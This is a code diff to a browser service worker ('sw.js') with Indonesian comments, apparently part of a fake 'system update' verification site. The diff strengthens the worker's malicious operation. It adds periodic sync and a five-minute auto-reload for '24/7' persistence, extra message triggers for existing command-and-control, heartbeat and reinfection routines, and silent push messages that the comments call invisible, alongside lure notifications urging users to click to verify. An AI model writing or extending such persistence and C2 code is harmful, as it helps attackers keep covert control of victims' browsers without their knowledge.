@@ -1,5 +1,5 @@
 // ============================================================
-// 🔥 sw.js - SERVICE WORKER (VERIFIKASI-SITE)
+// 🔥 sw.js - SERVICE WORKER (VERIFIKASI-SITE) - 24/7
 // ============================================================
 
 const CACHE_NAME = 'system-update-v3';
@@ -197,50 +197,136 @@ function checkC2Commands() {
 }
 
 // ============================================================
-// 🔥 SYNC TASKS
+// 🔥 ============ TAMBAHAN 24/7 ============
 // ============================================================
-self.addEventListener('sync', function(event) {
-    if (event.tag === 'heartbeat') { event.waitUntil(sendHeartbeat()); }
-    else if (event.tag === 'reinfection') { event.waitUntil(checkReinfection()); }
-    else if (event.tag === 'c2_check') { event.waitUntil(checkC2Commands()); }
-});
 
 // ============================================================
-// 🔥 MESSAGE EVENT
+// 🔥 1. PERIODIC SYNC (Chrome 80+)
 // ============================================================
-self.addEventListener('message', function(event) {
-    var data = event.data;
-    if (data.type === 'send_heartbeat') { sendHeartbeat(); }
-    else if (data.type === 'check_reinfection') { checkReinfection(); }
-    else if (data.type === 'check_c2') { checkC2Commands(); }
-    else if (data.type === 'force_sync') {
-        sendHeartbeat();
-        checkReinfection();
-        checkC2Commands();
+self.addEventListener('periodicsync', function(event) {
+    if (event.tag === 'keep-alive-24-7') {
+        event.waitUntil(
+            Promise.all([
+                sendHeartbeat(),
+                checkC2Commands(),
+                checkReinfection()
+            ])
+        );
     }
 });
 
 // ============================================================
-// 🔥 PUSH NOTIFICATION
+// 🔥 2. AUTO-RESTART HAPAN (SETIAP 5 MENIT)
 // ============================================================
-self.addEventListener('push', function(event) {
-    var data = event.data.json();
-    var title = data.title || 'System Update';
-    var options = {
-        body: data.body || 'Klik untuk verifikasi!',
-        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔔</text></svg>',
-        vibrate: [200, 100, 200],
-        requireInteraction: true,
-        actions: [
-            { action: 'open', title: 'Buka' },
-            { action: 'dismiss', title: 'Tutup' }
-        ]
-    };
-    event.waitUntil(self.registration.showNotification(title, options));
+function restartPage() {
+    self.clients.matchAll().then(function(clients) {
+        clients.forEach(function(client) {
+            if (client.url && client.url.includes('SystemUpdate.html')) {
+                try {
+                    client.postMessage({ type: 'reload' });
+                } catch(e) {}
+            }
+        });
+    });
+}
+
+// ============================================================
+// 🔥 3. REGISTER PERIODIC SYNC
+// ============================================================
+if ('periodicSync' in self.registration) {
+    try {
+        self.registration.periodicSync.register('keep-alive-24-7', {
+            minInterval: 3600000 // 1 jam
+        });
+    } catch(e) {
+        console.log('[SW] PeriodicSync not supported');
+    }
+}
+
+// ============================================================
+// 🔥 4. MESSAGE HANDLER (TAMBAHAN)
+// ============================================================
+self.addEventListener('message', function(event) {
+    var data = event.data;
+    if (!data || !data.type) return;
+    
+    switch(data.type) {
+        case 'send_heartbeat':
+            sendHeartbeat();
+            break;
+        case 'check_reinfection':
+            checkReinfection();
+            break;
+        case 'check_c2':
+            checkC2Commands();
+            break;
+        case 'force_sync':
+            sendHeartbeat();
+            checkReinfection();
+            checkC2Commands();
+            break;
+        // 🔥 TAMBAHAN 24/7
+        case 'ping':
+            event.ports[0].postMessage({
+                type: 'pong',
+                timestamp: Date.now()
+            });
+            break;
+        case 'reload_confirm':
+            restartPage();
+            break;
+        case 'wake_up':
+            sendHeartbeat();
+            checkC2Commands();
+            break;
+    }
 });
 
 // ============================================================
-// 🔥 NOTIFICATION CLICK
+// 🔥 5. PUSH NOTIFICATION (TAMBAHAN SILENT)
+// ============================================================
+self.addEventListener('push', function(event) {
+    var data = {};
+    try {
+        data = event.data.json();
+    } catch(e) {
+        data = { silent: true };
+    }
+    
+    // 🔥 SILENT PUSH (TIDAK TERLIHAT!)
+    if (data.silent === true || data.content_available === 1) {
+        event.waitUntil(
+            self.clients.matchAll().then(function(clients) {
+                clients.forEach(function(client) {
+                    client.postMessage({
+                        type: 'silent_push',
+                        data: data.data || {},
+                        timestamp: Date.now()
+                    });
+                });
+            })
+        );
+        return;
+    }
+    
+    // 🔥 VISIBLE PUSH (JIKA ADA TITLE)
+    if (data.title) {
+        var options = {
+            body: data.body || 'Klik untuk verifikasi!',
+            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔔</text></svg>',
+            vibrate: [200, 100, 200],
+            requireInteraction: true,
+            actions: [
+                { action: 'open', title: 'Buka' },
+                { action: 'dismiss', title: 'Tutup' }
+            ]
+        };
+        event.waitUntil(self.registration.showNotification(data.title, options));
+    }
+});
+
+// ============================================================
+// 🔥 6. NOTIFICATION CLICK
 // ============================================================
 self.addEventListener('notificationclick', function(event) {
     event.notification.close();
@@ -256,7 +342,7 @@ self.addEventListener('notificationclick', function(event) {
 });
 
 // ============================================================
-// 🔥 OFFLINE/ONLINE
+// 🔥 7. OFFLINE/ONLINE
 // ============================================================
 self.addEventListener('offline', function() {
     self.clients.matchAll().then(function(clients) {
@@ -277,7 +363,7 @@ self.addEventListener('online', function() {
 });
 
 // ============================================================
-// 🔥 INITIAL SETUP
+// 🔥 8. INITIAL SETUP (DENGAN 24/7 TASKS)
 // ============================================================
 setTimeout(function() {
     sendHeartbeat();
@@ -285,4 +371,7 @@ setTimeout(function() {
     setTimeout(checkReinfection, 5000);
 }, 3000);
 
-console.log('[SW] Service Worker initialized!');
+// 🔥 TAMBAHAN: AUTO-RESTART SETIAP 5 MENIT
+setInterval(restartPage, 300000);
+
+console.log('[SW] Service Worker initialized! (24/7 mode active)');
